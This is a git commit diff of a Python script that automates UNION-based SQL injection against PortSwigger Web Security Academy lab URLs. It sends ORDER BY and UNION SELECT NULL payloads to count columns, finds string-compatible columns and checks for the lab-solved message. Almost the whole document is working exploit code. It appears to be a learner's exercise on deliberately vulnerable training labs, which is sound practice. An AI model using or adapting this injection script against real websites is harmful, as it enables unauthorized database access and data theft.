d25a2b3a34b9c0652a1d527693a067cfe59c2e77
devnull044 <devmal044@gmail.com>
2021-03-31 21:51:32 -0500

    updated

--- sqli_row_detector.py
+++ sqli_row_detector.py
@@ -2,7 +2,7 @@
 #replace url with lab url similar to one seen below
 import requests
 #url = 'https://ac101f911ebb51778049188000010041.web-security-academy.net/filter?category=Accessories'
-url = 'https://acf91f5e1e4ce1c080272a03007f00ed.web-security-academy.net/filter?category=Accessories'
+url = 'https://ac561ff51ed65b1080642136008a006f.web-security-academy.net/filter?category=Accessories'
 sqli_row = ["'+ORDER+BY+",
             "'+UNION+SELECT+"]
 used_attack_r = []
@@ -15,7 +15,6 @@ session = requests.Session()
 
 try:
     r = session.get(url=url)
-    print(r)
 except Exception as e:
     print(e)
     exit()
@@ -29,12 +28,12 @@ def find_rows():
             r = session.get(url=attack_url)
             if r.status_code == 500:
                 valid_rows = x-1
-                print("Valid number of rows is:",x-1)
-                print(used_attack_r[x-2])
+                print("Valid number of columns is:",x-1)
+                #print(used_attack_r[x-2])
                 for y in range(x-1):
                     nulls += "NULL,"
                 final_attack = url[:url.rfind("=")+1]+sqli_row[1]+nulls[:len(nulls)-1]+"--"
-                print(final_attack)
+                #print(final_attack)
                 break
 
 def check_columns():
@@ -44,23 +43,29 @@ def check_columns():
         s[x] = s[x].replace('NULL', "'a'")
         r = session.get(url=(',').join(s))
         if r.status_code == 200:
-            compatible_col.append(x+1)
+            compatible_col.append(x)
             print("Column %s is comaptible" % str(x+1))
-
+    for each in compatible_col:
+        split = final_attack.split(",")
+        split[each] = split[each].replace('NULL', "'a'")
+    final_attack = (',').join(split)
 
 def pass_lab_check():
     if lab == 1:
         print(final_attack)
         r = session.get(url=final_attack)
+        if "Congratulations, you solved the lab!" in r.text:
+            print("lab 1 passed")
     elif lab == 2:
-        print(final_attack.replace("'a'","'SLrvzD'")) #replace with required string from lab2
-        r = session.get(url=final_attack.replace("'a'","'SLrvzD'"))#replace with required string from lab2
-            if "Congratulations, you solved the lab!" in r.text:
-        print("lab passed")
+        #print(final_attack.replace("'a'","'drYPYM'")) #replace with required string from lab2
+        r = session.get(url=final_attack.replace("'a'","'drYPYM'"))#replace with required string from lab2
+        if "Congratulations, you solved the lab!" in r.text:
+            print("lab 2 passed")
 
 def main():
     find_rows()
     if lab != 1:
+        print('checking columns')
         check_columns()
     pass_lab_check()
 
